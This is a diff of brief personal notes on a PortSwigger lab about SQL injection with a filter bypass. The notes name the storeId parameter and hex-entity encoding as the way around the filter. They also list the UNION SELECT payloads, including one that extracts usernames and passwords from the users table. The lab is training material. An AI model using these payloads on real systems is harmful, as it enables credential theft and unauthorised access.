@@ -5,6 +5,8 @@ https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter
 End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
 
 Analysis:
-
-1 UNION SELECT NULL, NULL
+vulnrerable entity storeId
+Hackvertor: hex_entities encoding
+1 UNION SELECT NULL
+1 UNION SELECT NULL, NULL Indicates only one column
 1 UNION SELECT username || '~'  || password  FROM users
